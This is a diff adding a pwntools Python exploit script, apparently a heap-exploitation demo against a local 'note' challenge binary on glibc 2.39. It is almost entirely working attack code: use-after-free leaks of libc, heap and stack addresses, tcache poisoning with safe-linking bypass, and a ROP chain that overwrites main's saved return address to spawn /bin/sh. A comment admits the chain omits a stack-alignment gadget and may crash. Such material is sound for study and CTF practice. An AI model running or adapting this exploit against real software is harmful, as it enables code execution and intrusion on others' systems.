@@ -1,0 +1,112 @@
+#!/usr/bin/env python3
+# Modern glibc heap exploitation demo -- "life after __free_hook"  (glibc 2.39)
+# UAF -> unsorted-bin libc leak -> safe-linking heap leak
+#     -> tcache poison to read environ (stack leak)
+#     -> self-locating scan for main's saved RIP
+#     -> tcache poison to drop a ROP chain on that slot -> shell
+from pwn import *
+
+context.binary = exe = ELF('./note', checksec=False)
+context.log_level = 'info'
+LIBC = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
+
+# --- per-libc constants ---
+# Locally these auto-tune to whatever glibc you're on (see STAGE A / C.5), so a fresh
+# clone just runs. The literals below are the glibc-2.39 values, kept as the fallback
+# for a REMOTE target (where io.libc is None) -- re-measure those with tune.gdb.
+UNSORTED_OFF = 0x203b20   # &main_arena.bins[0] : libc ptr a lone unsorted chunk leaks
+MAIN_RET_OFF = 0x2a1ca    # value sitting at main's saved RIP (into __libc_start_call_main)
+
+def mangle(pos, ptr): return (pos >> 12) ^ ptr
+def aligned_read_target(addr):
+    M = addr & ~0xf
+    if (addr - M) == 8: M -= 0x10
+    return M, addr - M
+
+io = process([exe.path], env={})
+def alloc(i, sz, data=b"\x00"):
+    io.sendlineafter(b"> ", b"1"); io.sendlineafter(b"idx: ", str(i).encode())
+    io.sendlineafter(b"size: ", str(sz).encode()); io.sendafter(b"data: ", data)
+def free(i):
+    io.sendlineafter(b"> ", b"2"); io.sendlineafter(b"idx: ", str(i).encode())
+def edit(i, data):
+    io.sendlineafter(b"> ", b"3"); io.sendlineafter(b"idx: ", str(i).encode()); io.sendafter(b"data: ", data)
+def show(i, n):
+    io.sendlineafter(b"> ", b"4"); io.sendlineafter(b"idx: ", str(i).encode()); return io.recvn(n)
+
+# ---- allocate all working chunks first, from a clean top ----
+alloc(0, 0x80)      # a0  H+0x2a0  heap-leak + poison-A
+alloc(1, 0x80)      # a1  H+0x330  poison-A partner
+alloc(2, 0x300)     # s0  H+0x3c0  scan poison        (chunk 0x310)
+alloc(3, 0x300)     # s1  H+0x6d0  scan poison partner
+alloc(4, 0xa0)      # a2  H+0x9e0  poison-B           (chunk 0xb0)
+alloc(5, 0xa0)      # a3  H+0xa90  poison-B partner
+alloc(6, 0x500)     # L   H+0xb40  libc leaker        (chunk 0x510, non-tcache)
+alloc(7, 0x500)     # G   H+0x1050 guard (keeps L off top)
+
+# ===== STAGE A : libc leak (unsorted bin) =====
+free(6)
+libc_leak = u64(show(6, 8))                       # &main_arena.bins[0], the real leak
+if getattr(io, "libc", None) and io.libc.address: # local: calibrate the arena offset
+    UNSORTED_OFF = libc_leak - io.libc.address    #   from this glibc, so it's version-agnostic
+libc_base = libc_leak - UNSORTED_OFF
+assert libc_base & 0xfff == 0, f"bad libc base {libc_base:#x} (set UNSORTED_OFF via tune.gdb)"
+LIBC.address = libc_base
+log.success(f"libc base : {libc_base:#x}  (unsorted off {UNSORTED_OFF:#x})")
+
+# ===== STAGE B : heap leak (safe-linking) =====
+free(0)
+heap_base = u64(show(0, 8)) << 12
+a0, a1 = heap_base + 0x2a0, heap_base + 0x330
+s0, s1 = heap_base + 0x3c0, heap_base + 0x6d0
+a2, a3 = heap_base + 0x9e0, heap_base + 0xa90
+log.success(f"heap base : {heap_base:#x}")
+
+# ===== STAGE C : poison #1 -> read environ (stack leak) =====
+env_addr = LIBC.sym['environ']              # absolute (LIBC.address set)
+M_env, d = aligned_read_target(env_addr)
+free(1)
+edit(1, p64(mangle(a1, M_env)))
+alloc(8, 0x80)                              # -> a1
+alloc(9, 0x80)                              # -> M_env
+stack = u64(show(9, 0x80)[d:d+8])
+log.success(f"environ   : {stack:#x}")
+
+# ===== STAGE C.5 : self-locate main's saved RIP by scanning the stack =====
+try:                                        # pwntools disassembles __libc_start_main to find the
+    ret_val = LIBC.libc_start_main_return   # return-after-main; absolute since LIBC.address is set
+except Exception:                           # (version-agnostic; no gdb, no hand-tuning)
+    ret_val = libc_base + MAIN_RET_OFF      # fall back to the literal (remote / old pwntools)
+scan_base = (stack - 0x300) & ~0xf          # window sits below environ, covers the RIP slot
+free(2); free(3)
+edit(3, p64(mangle(s1, scan_base)))
+alloc(10, 0x300)                            # -> s1
+alloc(11, 0x300)                            # -> scan_base
+window = show(11, 0x300)
+rip_slot = None
+for off in range(0, len(window) - 8, 8):
+    if u64(window[off:off+8]) == ret_val:
+        rip_slot = scan_base + off; break
+assert rip_slot, "saved-RIP slot not found (check MAIN_RET_OFF)"
+log.success(f"main RIP @ : {rip_slot:#x}  (environ - {stack - rip_slot:#x})")
+
+# ===== STAGE D : poison #2 -> overwrite saved RIP with a ROP chain =====
+rop     = ROP(LIBC)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret     = rop.find_gadget(['ret'])[0]
+binsh   = next(LIBC.search(b'/bin/sh\x00'))
+system  = LIBC.sym['system']
+chain   = p64(0) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(0)  # NO ret -> movaps CRASH
+
+RIP_M = rip_slot - 8                         # 16-aligned; key-zero hits RIP, our write overwrites it
+assert RIP_M % 16 == 0
+free(4); free(5)
+edit(5, p64(mangle(a3, RIP_M)))
+alloc(12, 0xa0)                              # -> a3
+alloc(13, 0xa0, chain)                       # -> RIP_M ; alloc-time write lands the chain
+
+# ===== STAGE E : leave main -> chain fires =====
+io.sendlineafter(b"> ", b"5")                # leave main -> saved RIP -> ROP -> execve("/bin/sh")
+io.recvline(timeout=2)
+log.success("ATTEMPTING shell WITHOUT ret alignment fix...")
+io.interactive()
